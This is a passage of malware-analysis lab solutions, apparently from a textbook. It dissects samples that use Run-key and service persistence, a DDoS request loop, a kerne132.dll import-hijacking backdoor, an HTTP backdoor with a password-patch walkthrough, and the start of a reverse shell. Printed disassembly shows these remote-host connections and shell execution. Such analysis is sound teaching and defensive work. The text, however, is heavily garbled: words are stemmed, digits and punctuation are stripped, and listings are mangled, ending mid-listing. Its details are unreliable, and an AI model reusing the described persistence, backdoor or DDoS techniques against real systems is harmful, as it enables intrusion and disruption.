shown numberofbytestoread paramet sinc know function read html web page think buffer array charact follow call internetreadfil code check see return valu eax function close handl termin code immedi follow line compar buffer one charact time shown exampl c notic time index buf fer goe move regist compar exampl c buffer handl e movsx ecx byte ptr ebpbuff ec cmp ecx ch ef jnz short locd f movsx edx byte ptr ebpbuff f cmp edx h fb jnz short locd fd movsx eax byte ptr ebpbuff cmp eax dh jnz short locd movsx ecx byte ptr ebpbuff cmp ecx dh jnz short locd mov al ebpvarc b jmp short locc cmp instruct check see first charact equal xc correspond symbol ascii rightclick ch ida pro offer chang display way throughout list h dh dh combin charact string happen start comment html html comment display view web page browser see view web page sourcenotic buffer move edx compar x ascii therefor assum buffer array charact web page download internetreadfil sinc buffer point start web page four cmp instruct use check html comment immedi start web page comparison success web page start embed html comment code execut unfortun ida pro fail realiz local variabl buffer size display local variabl name varc instead need fix stack function display byte array order buffer array label properli throughout function press ctrl k anywher within function exampl left side figur c show initi stack view fix stack rightclick first byte buffer defin array byte wide byte larg right side figur show correct stack look like manual adjust stack like caus instruct number exampl c display ebpbuff therefor first four charact bufferbuff match fifth charact move al return function figur c creat array fix stack return main method let analyz happen x function return function return nonzero valu main method print success pars command x x charact pars html comment follow call sleep function x use msdn learn sleep function take singl paramet contain number millisecond sleep push xea stack correspond sleep one minut millisecondsto summar program check activ internet connect download web page contain string start comment html html comment display web browser view look html page sourc techniqu hide command html comment use frequent attack send command malwar malwar appear go normal web pagelab solut short answer function x x lab solut x printf x function new lab new function take two paramet first command charact pars html comment second program name argv standard main paramet new function contain switch statement jump tabl new function print error messag delet file creat directori set registri valu copi file sleep second registri key softwaremicrosoftwindowscurrentversionrunmalwar file locat ctempccex hostbas indic program first check activ internet connect internet connect found program termin otherwis program attempt download web page contain embed html comment begin first charact comment pars use switch statement determin action take local system includ whether delet file creat directori set registri run key copi file sleep second detail analysi begin perform basic static analysi binari find sever new string interest shown exampl c exampl c interest new string contain lab solut error valid command provid error could set registri valu malwar softwaremicrosoftwindowscurrentversionrun ctempccex ctempthes error messag suggest program may abl modifi registri softwaremicrosoftwindowscurrentversionrun common autorun locat registri ctempccex directori filenam may use hostbas indic look import see sever new window api function found lab solut shown exampl c exampl c interest new import function contain lab solut deletefilea copyfilea createdirectorya regopenkeyexa regsetvalueexa first three import selfexplanatori regopenkeyexa function typic use regsetvalueexa insert inform registri usual malwar set anoth program start system boot sake persist discuss window registri depth chapter next perform dynam analysi find isnt fruit surpris base discov lab solut could connect malwar directli internet use inetsim serv web page malwar wouldnt know put html comment therefor need perform indepth analysi look disassembl final load execut ida pro main method look nearli ident one lab solut except extra call x call x check internet connect x download web page pars html comment ident lab solut next examin paramet pass x look like argv var push onto stack call case argv argv refer string contain current program name labex examin disassembl see var set al xd rememb eax return valu previou function call al contain within eax case previou function call x download web page pars html comment therefor var pass x contain command charact pars html commentnow know pass function x analyz exampl c start function exampl c analyz function x movsx eax ebparg mov ebpvar eax mov ecx ebpvar sub ecx h mov ebpvar ecx cmp ebpvar ja loce mov edx ebpvar jmp dsofffedx f offf dd offset loca f dd offset locc fa dd offset locf fe dd offset locc dd offset locd arg automat label ida pro list last paramet push call therefor arg pars command charact retriev internet pars command charact move var eventu load ecx next instruct subtract x letter ascii ecx therefor instruct execut ecx equal arg equal next comparison number check see command charact arg b c e result forc ja instruct leav section code otherwis see pars command charact use index jump tabl edx multipli jump tabl set memori address referenc differ possibl path memori address byte size jump tabl five entri expect jump tabl like often use compil gener assembl switch statement describ chapter graphic view command charact switch let look graphic view function shown figur c see six possibl path code includ five case default jump instruct take us default path otherwis jump tabl caus execut path e branch see graphlik one figur singl box go mani differ box suspect switch statement confirm suspicion look code logic jump tabl figur c switch statement function x shown graphic mode label switch option switch option next examin switch option e individu option call createdirectori paramet ctemp creat path doesnt alreadi exist b option call copyfil take two paramet sourc destin file destin ctempccex sourc paramet pass function base earlier analysi know program name argv therefor option would copi labex ctempccex c option call deletefil paramet ctempccex delet file exist option set valu window registri persist specif set softwaremicrosoftwindowscurrentversionrunmalwar ctempccex make malwar start system boot first copi temp locationth e option sleep second final default option print error valid command provid analyz function fulli combin analysi lab solut gain strong understand overal program oper know program check activ internet connect use construct valid internet connect program termin otherwis program attempt download web page contain embed html comment start next charact pars comment use switch statement determin action take local system delet file creat directori set registri run key copi file sleep secondslab solut short answer function x check internet connect method x pars html method xb printf x switch statement loop ad main method function x take paramet call sprintf format string internet explor pmad build userag use http commun use argument pass program run minut hour ye new userag use take form internet explor pmad number minut program run first program check activ internet connect none found program termin otherwis program use uniqu user agent attempt download web page contain counter track number minut program run web page download contain embed html comment start next charact pars comment use switch statement determin action take local system hardcod action includ delet file creat directori set registri run key copi file sleep second program run hour termin detail analysi begin perform basic static analysi binari see one new string interest lab solut follow internet explor pmad look like program may use dynam gener userag look import dont see window api function lab solut perform dynam analysi also notic userag chang see internet explor pma next perform indepth analysi disassembl load execut ida pro look main method clearli structur differ main lab solut although mani function call see function x check internet connect method x pars html method xb printf x switch statement renam function ida pro make easier analyz look main method ida pro graphic view mode see upward face arrow signifi loop exampl c show loop structur exampl c loop structur loc mov ebpvarc f jmp short loca loc mov eax ebpvarc add eax mov ebpvarc eax loca cmp ebpvarc ah jge short locaf mov ecx ebpvarc push ecx call sub push call dssleep ad jmp short loc variabl varc local variabl use loop counter counter initi jump past increment perform check loop back incrementor get presenc four code section tell us look loop code construct varc counter greater equal xa loop end otherwis code start execut code push varc stack call x sleep minut loop increment counter one therefor process repeat minut equal hour previou lab x take paramet need investig thisfurth exampl c show start x exampl c function x mov eax ebparg c push eax push offset aint internet explor pmad lea ecx ebpszag push ecx char call sprintf b add esp ch e push dwflag push lpszproxybypass push lpszproxi push dwaccesstyp lea edx ebpszag push edx lpszagent call dsinternetopena arg paramet main method call x conclud arg alway counter varc main method arg push stack along format string destin also see sprintf call creat string store destin buffer local variabl label szagent sza gent pass internetopena mean everi time counter increas user agent chang mechan use attack manag monitor web server track long malwar run summar program check activ internet connect use construct connect found program termin otherwis program use uniqu userag attempt download web page contain counter loop construct counter contain number minut program run web page contain embed html comment read array construct charact compar next charact pars comment use switch construct determin action take local system hardcod action includ delet file creat directori set registri run key copi file sleep second program run minut hour terminatinglab solut short answer program creat servic malservic ensur run everi time comput start program use mutex ensur one copi program run time could search mutex name hgl servic malservic malwar use userag internet explor commun wwwmalwareanalysisbookcom program wait midnight januari send mani request httpwwwmalwareanalysisbookcom presum conduct distribut denialofservic ddo attack site program never finish wait timer year creat thread run infinit loop detail analysi first step analyz malwar depth open ida pro similar tool examin import function list mani function list provid littl inform commonli import window execut stand specif openscmanag crea teservic indic malwar probabl creat servic ensur run comput restart import startservicectrldispatchera hint file actual servic call internetopen internetopenurl tell us program might connect url download content next jump main function ida pro identifi label wmain locat x quick glanc code show short enough analyz complet wmain function call one function shown follow list code longer would need focuson interest function call base review import tabl lea eax esphservicestartt mov esphservicestarttablelpservicenam offset amalservic malservic f push eax lpservicestartt mov esphservicestarttablelpserviceproc offset sub mov esphvar mov esphvar call dsstartservicectrldispatchera e push push call sub code begin call startservicectrldispatchera accord msdn document function use program implement servic usual call immedi function specifi servic control function servic control manag call specifi sub call call startservicectrldispatchera first portion code includ call startservicectrldispatchera bookkeep code necessari program run servic doesnt tell us program tell us expect run servic next examin sub function shown follow list sub esp h push offset name hgl b push binherithandl push fh dwdesiredaccess call dsopenmutexa test eax eax jz short loc c push uexitcod e call dsexitprocess first function call openmutexa thing note call attempt obtain handl name mutex hgl call fail program exit next call shown follow list push esi push offset name hgl push binitialown c push lpmutexattribut e call dscreatemutexathi code creat mutex name hgl combin two mutex call design ensur one copi execut run system given time copi alreadi run first call openmutexa would success program would exit next code call openscmanag open handl servic control manag program add modifi servic next call getmodulefilenam function return full pathnam current run execut load dll first paramet handl modul name retriev null get full pathnam execut full pathnam use createservicea creat new servic createservicea call mani paramet key one note follow list push lppassword c push lpservicestartnam e push lpdepend push lpdwtagid lea ecx esphbinarypathnam push lploadordergroup push ecx lpbinarypathnam push dwerrorcontrol ab push dwstarttyp ad push h dwservicetyp af push dwdesiredaccess b push offset displaynam malservic b push offset displaynam malservic bb push esi hscmanag bc call dscreateservicea key createservicea paramet binarypathnam dwstarttyp dwservicetyp binari path execut path current run execut retriev getmodulefilenam call getmodulefilenam call need malwar may know directori filenam dynam obtain inform instal servic matter execut call store msdn document list valid entri dwservicetyp dwstarttyp paramet dwstarttyp possibl servicebootstart x servicesystemstart x serviceautostart x servicedemandstart x servicedis x malwar pass x correspond toserviceautostart indic servic run automat system startup lot code manipul timerel structur ida pro label structur systemtim structur one sever window time structur accord msdn systemtim structur separ field second minut hour day use specifi time case valu first set valu year set x decim time repres midnight januari program call systemtimetofiletim time format c xor edx edx c lea eax esphduetim c mov dword ptr esphsystemtimewyear edx cc lea ecx esphsystemtim mov dword ptr esphsystemtimewdayofweek edx push eax lpfiletim mov dword ptr esphsystemtimewhour edx push ecx lpsystemtim da mov dword ptr espchsystemtimewsecond edx de mov espchsystemtimewyear h e call dssystemtimetofiletim next program call createwaitabletim setwaitabletim waitforsingleobject import argument purpos lpduetim argument setwaitabletim argument filetim return systemtimetofiletim shown preced list code use waitforsingleobject wait januari code loop time shown follow list mov esi h push lpthreadid push dwcreationflag push lpparamet c push offset startaddress lpstartaddress push dwstacksiz push lpthreadattribut call edi createthread dec esi jnz short loc esi set counter x decim end loop esi decrement hit zero loop exit call createthread sever paramet one import us lpstartaddress paramet tell us function use start address threadlabel startaddress casew doubleclick startaddress see function call internetopen initi connect internet call internetopenurla within loop shown follow code push dwcontext f push h dwflag push dwheaderslength push lpszheader push offset szurl httpwwwmalwareanalysisbookcom push esi hinternet e call edi internetopenurla jmp short locd jmp instruct end loop uncondit jump mean code never end call internetopenurla download home page wwwmalwareanalysisbookcom forev createthread call time thread call internetopenurla forev clearli malwar design launch ddo attack instal mani machin infect machin connect server time januari may overload server make imposs access site summari malwar use mutex ensur one copi run time creat servic ensur run system reboot wait januari continu download wwwmalwareanalysisbookcom indefinit note malwar doesnt perform function requir servic normal servic must implement function stop paus must chang statu let user os know servic start malwar none servic statu alway display startpend servic stop run malwar often implement enough function achiev author goal without bother implement entir function requir specif note ran lab without virtual machin remov malwar enter sc delet malservic command line delet file itselflab solut short answer program achiev persist run exit program display advertis web page user program finish execut display advertis detail analysi begin basic static analysi dont see interest ascii string see one interest unicod string httpwwwmalwareanalysisbookcomadhtml check import export program see import addit standard import follow sysfreestr sysallocstr variantinit cocreateinst oleiniti oleuniniti function comrel cocreateinst oleiniti function particular requir order use com function next tri dynam analysi run program open internet explor display advertis there evid program modifi system instal execut comput restart analyz code ida pro navig main method see code shown follow list push pvreserv call dsoleiniti b test eax eax jl short loc f lea eax esph ppv push eax ppv push offset riid riid push dwclscontext b push punkout push offset rclsid rclsid call dscocreateinst mov eax esph ppv first thing malwar initi com obtain pointer com object oleiniti cocreateinst com object return store stack variabl ida pro label ppv shown order determin com function use need examin interfac identifi iid class identifi clsid click rclsid riid show dfc dccdafdaecfce respect determin program call check registri clsid search iid internet document case valu identifi use compon object model iid iwebbrows clsid internet explor shown follow list com object return cocreateinst access instruct later c mov eax esphppv push ecx lea ecx espchpvarg mov edx eax push ecx lea ecx esphpvarg c push ecx lea ecx esphvar push ecx push esi push eax call dword ptr edxch follow instruct eax point locat com object eax dereferenc edx point begin com object function offset xc object call discuss chapter offset xc iwebbrows interfac navig function use structur window ida pro creat structur label offset navig call internet explor navig web address httpwwwmalwareanalysisbookcomadhtml call navig cleanup function program end program doesnt instal persist doesnt modifi system simpli display onetim advertis encount simpl program like one consid itsuspect may come packag addit malwar one componentlab solut short answer program achiev persist write dll cwindowssystem modifi everi exe file system import dll program hardcod use filenam kern dll make good signatur note use number instead letter l program use hardcod mutex name sadfhuhf purpos program creat difficulttoremov backdoor connect remot host backdoor two command one execut command one sleep program hard remov infect everi exe file system probabl best case restor backup restor backup particularli difficult could leav malici kern dll file modifi remov malici content altern could copi kerneldl name kern dll write program undo chang pe file detail analysi first well look labex use basic static analysi techniqu run string execut get usual invalid string import function also get day week month year string part librari code part malici execut follow list show code sever interest string kernedl exe warningthiswilldestroyyourmachin cwindowssystemkerneldl labdll kernel cwindowssystemkernedl c string kern dll clearli design look like kerneldl replac l note remaind section impost kernedl bold make easier differenti kerneldl string labdll tell us exe may access dll lab way string warningthiswilldestroyyourmachin interest actual artifact modif made malwar book normal malwar would contain string well see usag malwar later next examin import labex interest follow createfilea createfilemappinga mapviewoffil isbadreadptr unmapviewoffil closehandl findfirstfilea findclos findnextfilea copyfilea import createfilea createfilemappinga mapviewoffil tell us program probabl open file map memori findfirstfilea findnextfilea combin tell us program probabl search directori use copyfilea copi file find fact program import labdll use function dll loadlibrari getprocaddress suggest probabl doesnt load dll runtim behavior suspect someth need examin part analysi next check dll interest string import find string worth investig follow hello sleep exec interest string ip address malwar might connect set networkbas sensor look activ address also see string hello sleep exec shouldexamin open program ida pro next check import labdll see import wsdll contain function necessari send receiv data network also note createprocess function tell us program may creat anoth process also check export labdll see oddli none without export cant import anoth program though program could still call loadlibrari dll export well keep mind look close dll next tri basic dynam analysi run execut exit quickli without much notic activ could tri run dll use rundll dll export wont work unfortun basic dynam analysi doesnt tell us much next step perform analysi use ida pro whether start dll exe matter prefer well start dll simpler exe analyz dll look dll ida pro see export see entri point navig dllmain automat label ida pro unlik prior two lab dll lot code would take realli long time go instruct instead use simpl trick look call instruct ignor instruct help get quick view dll function let see code would look like relev call instruct call allocaprob call dsopenmutexa e call dscreatemutexa e call dswsastartup call dssocket af call dsinetaddr bb call dshton ce call dsconnect call dssend call dsshutdown call dsrecv b call ebp strncmp call dssleep call ebp strncmpaf call ebx createprocessa c call dssleep first call librari function allocaprob alloc stack space tell function use larg stack follow call openmutexa createmutexa like malwar lab solut ensur one copi malwar run one time list function need establish connect remot socket transmit receiv data function end call sleep createprocessa point dont know data sent receiv process creat guess dll best explan function send receiv data creat process design receiv command remot machin know function need see data sent receiv first check destin address connect line connect call see call inetaddr fix ip address also see port argument x port port normal use web traffic data commun call send shown follow list f push flag f repn scasb f ecx f dec ecx fa push ecx len fb push offset buf hello push esi call dssend see buf argument store data sent network ida pro recogn pointer buf repres string hello label appear greet victim machin send let server know readi command next see data program expect respons follow lea eax espchbuf b push h len push eax buf push esi call dsrecvif go call recv see buffer stack label ida pro notic instruct first access buf lea instruct instruct doesnt derefer valu store locat instead obtain pointer locat call recv store incom network traffic stack must determin program respons see buffer valu check line later shown follow list c lea ecx esphbuf push sizet push ecx char push offset asleep sleep b call ebp strncmp add esp ch test eax eax jnz short loc push h dwmillisecond call dssleep buffer access one previou list even though offset esp differ espbuf one espcbuf differ due fact size stack chang ida pro label buf make easi tell theyr valu code call strncmp check see first five charact string sleep immedi function call check see return valu call sleep function sleep second tell us remot server send command sleep program call sleep function see buffer access instruct later follow lea edx esphbuf push sizet push edx char b push offset aexec exec call ebp strncmp add esp ch test eax eax jnz short locb mov ecx h e lea edi esphstartupinfo rep stosd lea eax esphprocessinform lea ecx esphstartupinfo c push eax lpprocessinform push ecx lpstartupinfo push lpcurrentdirectori push lpenviron push h dwcreationflag push binherithandl push lpthreadattribut b lea edx esph commandlin push lpprocessattribut push edx lpcommandlin push lpapplicationnam mov esphstartupinfocb h af call ebx createprocessa time see code check see buffer begin exec strncmp function return shown code fall jnz instruct call createprocessa function lot paramet createprocessa function shown interest commandlin paramet tell us process creat list suggest string commandlin store stack somewher earlier code need determin search backward code find commandlin place cursor commandlin oper highlight instanc within function commandlin valu access unfortun look whole function youll see commandlin pointer seem access set elsewher function point stuck see createprocessa call program run store commandlin dont see commandlin written anywher commandlin must written prior use paramet createprocessa still work tricki case ida pro automat label actual made difficult identifi commandlin written ida pro function inform shown follow list tell us commandlin correspond valu xffb bool stdcall dllmain dllmain proc near hobject dword ptr fh name sockaddr ptr fh processinform processinform ptr eh startupinfo startupinfoa ptr dh wsadata wsadata ptr h buf byte ptr h commandlin byte ptr ffbh arg dword ptr rememb receiv buffer start x valu set use lea instruct tell us data store stack pointer data also fact xffb byte receiv buffer tell us command execut whatev store byte receiv buffer case mean data receiv remot server would exec fullpathofprogramtorun malwar receiv exec fullpathofprogramtorun command string remot server call createprocessa fullpathofprogramtorun bring us end function dll know dll implement backdoor function allow attack launch execut system send respons packet port there still mysteri dll export function dll run content dll offer explan well need defer question later analyz exe next navig main method execut one first thing see check commandlin argument shown follow list mov eax espargc sub esp h cmp eax push ebx b push ebp c push esi push edi e jnz loc mov eax esphargv mov esi offset awarningthisw warningthiswilldestroyyourmachin mov eax eax code xref main j mov dl eax mov bl esi mov cl dl cmp dl bl jnz short loc test cl cl c jz short loc e mov dl eax mov bl esi mov cl dl cmp dl bl jnz short loc add eax add esi test cl cl jnz short loc code xref mainc j xor eax eax jmp short loc first comparison check see argument count argument count code jump anoth section code prematur exit happen tri perform dynam analysi program end quickli program move argv eax warningthiswilldestroyyourmachin string esi loop compar valu store esi eax program jump locat return function without anyth els weve learn program exit immedi unless correct paramet specifi command line correct usag program follow labex warningthiswilldestroyyourmachin note malwar differ behavior requir commandlin argument realist although messag argument requir malwar normal cryptic chose use argument ensur wont accident run import machin damag comput difficult remov point could go back redo basic dynam analysi enter correct paramet get program execut code keep momentum go well continu static analysi get stuck perform basic dynam analysi continu ida pro see call createfil createfilemap mapviewoffil open kerneldl dll labdll look function see lot complic read write memori could care analyz everi instruct would take long let tri look function call first see two function call sub sub function rel short neither call function function compar memori calcul offset write memori tri determin everi last oper program skip tediousmemoryoper function analyz timeconsum function like common trap avoid unless absolut necessari also see lot arithmet well memori movement comparison function probabl within two open file kerneldl labdll program read write two open file could painstakingli track everi instruct see chang made much easier skip use dynam analysi observ file access modifi scroll ida pro see interest code call window api function first call closehandl two open file know malwar finish edit file call copyfil copi labdll place cwindowssystem kernedl clearli meant look like kerneldl guess kernedl use run place kerneldl point dont know kernedl load call closehandl copyfil tell us portion code complet next section code probabl perform separ logic task continu look main method near end see anoth function call take string argument c follow push offset ac c b call sube unlik function call main sube call sever import function look interest navig sube would expect see ida pro name first argument function arg label lpfilenam instead know filenam use paramet window api function accept filenam paramet one first thing function call findfirstfil c search c drive follow call findfirstfil see lot arithmet comparison anoth tediou timeconsum function skip return need inform later first call see malloc sube function current analyz tell us recurs function call next function call isstricmp follow f call dsstricmp fc add esp ch ff test eax eax jnz short locc push ebp lpfilenam call suba argument stricmp function push onto stack instruct function call still find look recent push instruct string comparison check string exe call function suba see match well finish review function see suba dig see call findnextfilea see jump call indic function perform loop end function findclos call function end exceptionhandl code point say high confid function search c drive exe file someth file exe extens recurs call tell us probabl search whole filesystem could go back verifi detail sure would take long time much better approach perform basic dynam analysi process monitor procmon verifi search everi directori file end exe order see program exe file need analyz function suba call exe extens found suba complex function would take long analyz care instead look function call see first call createfil createfilemap mapviewoffil map entir file memori tell us entir file map memori space program read write file without addit function call complic analysi harder tell file modifi well move quickli function use dynam analysi see chang made file continu review function see arithmet call isbadptr verifi pointer valid see call stricmp shown follow listing push offset akerneldl kerneldl push ebx char call dsstricmp add esp test eax eax f jnz short loca mov edi ebx ecx ffffffffh repn scasb ecx mov eax ecx c mov esi offset dword mov edi ebx shr ecx rep movsd mov ecx eax ecx rep movsb call stricmp program check string valu kerneldl instruct later see program call repn scasb rep movsd function equival strlen memcpi function order see memori address written memcpi call need determin what store edi regist use rep movsd instruct edi load valu ebx need see ebx set see ebx load valu pass stricmp mean function find string kerneldl code replac someth determin replac string go rep movsd instruct see sourc offset dword doesnt make sens dword valu overwrit string kerneldl make sens one string valu overwrit anoth follow list show store dword dword dd ebh data xref dword dd h data xref mainbr dword dd cceh data xref maincr c dword c dd data xref maincbr recogn hex valu begin ascii charact ida pro mislabel data put cursor line dword press key keyboard convert data string kernedl know execut search filesystem everi fileend exe find locat file string kerneldl replac kern dll previou analysi know lab dll copi cwindowssystem name kernedl point conclud malwar modifi execut access kernedl instead kerneldl indic kernedl load execut modifi load kernedl instead kerneldl point weve reach end program abl use dynam analysi fill gap use procmon confirm program search filesystem exe file open procmon show program open everi execut system select exe file open check import directori confirm import kerneldl replac import kernedl mean everi execut system attempt load malici dlleveri singl one next check see program modifi kerneldl labdll calcul md hash kerneldl program run clearli see malwar modifi kerneldl open modifi labdll name kernedl see export section open peview see export function kerneldl export forward export actual function still kerneldl overal effect modif whenev exe file run comput load malici kernedl run code dllmain function unchang code execut program still call origin kerneldl analyz malwar complet could creat hostand networkbas signatur base know could write malwar report gloss lot code analysi complic miss anyth noth import malwar analysi code main method access kerneldl labdll pars export section kerneldl creat export section lab dll export function creat forward entri kerneldl malwar need scan kerneldl export creat forward entri impost kernedl kerneldl differ differ system tailor version kernedl export exactli function real kerneldl function modifi exe code found import directori could modifi import kerneldl set bound import tabl zero would use care timeconsum analysi could determin function howev analyz malwar time often essenc typic focu what import tri worri littl detail wont affect analysislab solut short answer get program instal provid option along password altern patch binari skip password verif check commandlin option program one four valu password password string abcd requir action except default behavior option instruct malwar instal option instruct malwar remov c option instruct malwar updat configur includ beacon ip address cc option instruct malwar print current configur consol default malwar function backdoor instal patch binari chang first byte function address x alway return true assembl instruct behavior mov eax x retn correspond byte sequenc b c malwar creat registri key hklmsoftwaremicrosoftxpsconfigur note trail space microsoft malwar also creat servic xyz manag servic xyz paramet provid instal time name malwar execut final malwar copi window system directori may chang filenam match servic name malwar instruct execut one five command via network sleep upload download cmd noth sleep command instruct malwar perform action given period time upload command read file network write local system specifi path download command instruct malwar send content local file network remot host cmd command caus malwar execut shell command localsystem noth command noop command caus malwar noth default malwar beacon httpwwwpracticalmalwareanalysiscom howev configur beacon http get request resourc form xxxxxxxxxxx x random alphanumer ascii charact malwar provid http header request detail analysi start debug malwar ollydbg use f key stepov arriv address x call main function easiest way figur main function start xaf use ida pro next use f key stepinto call main function continu step forward use f f note behavior sampl accident go far reset execut begin press ctrl f first malwar check see number commandlin argument equal address xafd specifi paramet check succe execut resum address x next attempt open registri key hklmsoftwaremicrosoft xp howev sinc registri key exist function return zero execut call function x function x use getmodulefilenamea get path current execut build ascii string c del pathtoexecut nul figur c show instanc string regist window ollydbg note content edx xe ollydbg correctli interpret pointer ascii string malwar attempt delet disk combin construct string program cmdex call shellexecutea fortun file open ollydbg window allow file delet behavior consist saw basic dynam analysi sampl chapter labsfigur c malwar prepar delet seen string pointer edx next task coerc malwar run properli least two option provid commandlin argument satisfi check address xafd modifi code path check registri key modifi code path may unintend effect later instruct depend inform store key inform chang malwar could fail execut let tri provid commandlin argument first avoid potenti issu choos entri string list use command line argument test whether malwar someth interest choos debug argument shown figur c add argument ollydbg argument dialog shown figur c malwar execut argument still tri delet tell us commandlin argument yet valid let use ollydbg step code flow give malwar paramet see what happeningfigur c choos debug argument figur c ad argumentexampl c show function setup paramet check exampl c function setup argc comparison af push ebp af mov ebpesp af mov eaxc af call labeb afd cmp dword ptr ssebp b jnz short labbd see check commandlin paramet execut take jump xb argc number string argument pass program found byte frame pointer sinc first argument main function xbe last commandlin argument pass function start address x know last argument main function standard c program take two paramet argc number commandlin paramet argv array pointer commandlin paramet eax contain argc ecx contain argv shown exampl c instruct perform pointer arithmet select last element array commandlin paramet pointer end eax push onto top stack prior function call exampl c pointer last element argv push stack bd mov eaxdword ptr ssebp argc b mov ecxdword ptr ssebpc argv b mov edxdword ptr dsecxeax b mov dword ptr ssebpedx ba mov eaxdword ptr ssebp bd push eax basic disassembl view provid ollydbg give rough overview function start address x function call scan instruct see use arithmet oper add sub mul xor bytes operand address x x look like routin saniti check input use convolut hardcod algorithm like input type password code note perform full analysi x determin password abcd beequal success use password patch method explain next rather revers algorithm patch binari password check function x alway return valu associ success check allow us continu analyz meat malwar note inlin function call strlen address xb x argument fail check eax zero execut resum function cleanup xa revers reveal correct argument caus function return valu well patch return case regardless argument insert instruct shown exampl c exampl c patch code password check b mov eax x c ret assembl instruct use assembl option ollydbg get byte sequenc b c call instruct prepar stack ret instruct clean overwrit instruct begin password check function address x edit instruct rightclick start address wish edit select binari edit figur c show relev context menu item figur c patch binari figur c show assembl instruct enter edit dialog sinc want write byte previou instruct took byte uncheck box label keep size enter assembl hex valu hex field click ok ollydbg automat assembl display new instruct appropri locat next saveth chang execut rightclick disassembl window select copi execut modif accept dialog save new version labpatchedex test whether password check function success disabl tri debug commandlin paramet time malwar success pass check address x jump address xbf six instruct later pointer first commandlin paramet push onto stack next pointer anoth ascii string figur c show state stack point figur c insert new instruct figur c state stack address xb function address xf mbscmp stringcomparison function recogn ida pro flirt signatur databas malwar use mbscmp check commandlin paramet list support option determin behavior next malwar check two commandlin paramet provid sinc provid one check fail malwar attempt delet pass check provid addit command line paramet recal last commandlin paramet treat password sinc patch password function provid string password set abreakpoint address xb quickli return commandlin paramet check add junk commandlin argument restart debug process malwar accept commandlin paramet perform intend behavior continu debug malwar see malwar attempt open servic manag address xcc use basenam malwar execut basenam portion path directori file extens inform strip servic exist malwar creat autostart servic name form basenam manag servic binari path systemrootsystemfilenam figur c show state call stack createservicea call includ ascii string name descript path address xa malwar copi systemrootsystem function address xb alter modifi access chang timestamp copi match system file kerneldl modifi timestamp match anoth file known timestomp figur c stack state call createservicea address x final malwar creat registri key hklmsoftwaremicrosoft xp trail space microsoft make uniqu hostbas indic fill valu name configur content buffer point edx regist address xbe find content buffer set breakpoint address xbe run press f rightclick content edx regist regist window select follow dump hex dump view show four nulltermin string follow mani zero shown figur c string contain valuesup httpwwwpracticalmalwareanalysiscom look like may configur data relat network capabl malwar figur c network string seen memori commandlin option analysi instal routin malwar document explor function continu debug ollydbg disassembl ida pro first well use ida pro describ code path sampl support switch c cc shown tabl c easili identifi main function look call mbscmp tabl c support commandlin switch commandlin switch address implement behavior x instal servic x uninstal servic c x set configur key cc x print configur key compar function start address x correspond commandlin paramet instal function examin earlier function exact opposit function x open servic manag address x locat instal malwar address x delet servic address x final delet copi malwar locat systemrootsystem remov configur registri valu address xad xad next look function start address x run provid c switch youv dilig renam function descript name ida pro obviou alreadi encount function instal uninstal routinesif youv forgotten updat function name use crossrefer featur ida pro verifi function use place navig function implement click function name rightclick name select xref function start x take four paramet concaten togeth string concaten function inlin identifi rep movsx repeat move string instruct function write result buffer registri valu configur window registri key hklmsoftwaremicrosoft xp provid c switch malwar allow user updat malwar configur window registri figur c show entri window registri use regedit default instal malwar function x execut cc switch provid revers configur function x read content configur registri valu place field buffer specifi function argument cc switch provid malwar current configur read registri format string malwar print string consol output cc switch default instal malwar clabpatchedex cc epar kup hhttpwwwpracticalmalwareanalysiscom p per figur c configur registri valu final code path reach malwar instal provid commandlin paramet malwar check instal address x determin whether registri key creat implement default behavior found function start address x note jump x back xd indic loop three exit condit address xb xe x lead directli program termin look like malwar get current configur call function sleep second repeat process forev backdoor analysi backdoor function implement chain function first call infinit loop function x call function start address xe compar begin string return list support valu sleep upload download cmd noth malwar encount one string call function respond request process similar pars commandlin argument tabl c summar support command show adjust paramet ital tabl c support command command address implement command string format behavior sleep x sleep sec sleep sec second upload xe upload port filenam creat file filenam local system first connect remot host port port read content download x download port filenam read file filenam send remot host port port cmd x cmd port command execut shell command command cmdex send output remot host port portnoth x noth oper note upload download command revers standard usag alway focu underli function analysi individu string use malwar network analysi point see fullfeatur backdoor hand malwar execut arbitrari shell command builtin routin file upload download next well explor function start address xe return command behavior dispatch show command commun malwar remot host may enabl us creat networkbas signatur sampl brows content xe see quit call function one crossrefer rather fulli revers function debug code path use ollydbg ensur malwar success instal run malwar cc option print current configur program instal attempt delet next open malwar ollydbg delet save commandlin paramet malwar perform default behavior set breakpoint address xe easili navig address press ctrl g enter e set breakpoint locat press f run region time use step press f pay particular attent function argument return valu first well examin function start x set breakpoint call address xe instruct immedi xea first breakpoint two paramet push onto stack top stack see address xbaac follow integ x follow address dump view see contain larg chunk zerosprob least x byte free space next run malwar press f second breakpoint function start address x malwar write ascii stringhttpwwwpracticalmalwareanalysiscom buffer correctli hypothes function get particular configur valu window registri initi instal put buffer let tri approach function start address x xd function start x analog function start x except return number x rather url string contain port number associ server httpwwwpracticalmalwareanalysiscom function start xd littl differ return valu invoc rather appear return ascii string contain random charact debug function mani time pattern appear involv forward slash dot charact perhap return string correspond urllik scheme malwar analyz isol test environ repeatedli fail somewher within next function start address xd return disassembl view ida pro see within function malwar construct http get request connect remot system connect unlik block corpor firewal sinc valid outbound http request malwar analysi virtual machin network disabl outbound connect never succeed malwar fail howev follow disassembl list care see malwar fact attempt connect domain port record registri configur key request randomli name resourc analysi disassembl show malwar search document return server particular string backtick apostroph backtick apostroph backtick apostroph backtick apostroph backtick apostroph use delin commandandcontrol protocol malwar summari sampl http revers backdoor password abcd must provid last paramet invok malwar instal configur remov instal copi thesystemrootwindowssystem directori creat autorun servic malwar cleanli remov pass commandlin argument reconfigur use c flag run instal malwar use registri key fetch server configur inform make http get request remot system commandandcontrol protocol embed within respons document malwar recogn five command includ one specifi execut arbitrari shell commandslab solut short answer import string cmd interest string appear static binari termin without much renam file oclex run string built stack use attack obfusc string simpl string util basic static analysi techniqu string qazwsxedc pointer buffer data pass subroutin x malwar use domain practicalmalwareanalysiscom malwar xor encod dn name string qazwsxedc decod domain name malwar set stdout stderr stdin handl use startupinfo structur createprocessa socket sinc createprocessa call cmd argument creat revers shell tie command shell socket detail analysi use dynam analysi ollydbg analyz piec malwar order determin function get debug let begin run string binari see import string cmd next well simpli run binari see anyth interest happen base process launch exit process explor process seem termin almost immedi definit go need debug piec see what go load binari ida pro see main function begin x ollydbg break entri point applic entri point contain lot uninterest code gener compil well set asoftwar breakpoint main sinc want focu decod stackform string click run button hit first breakpoint main first thing notic larg seri mov instruct move singl byte local variabl begin shown exampl c exampl c build ascii string stack one charact time push ebp mov ebp esp b sub esp h push esi push edi mov ebpvarb h mov 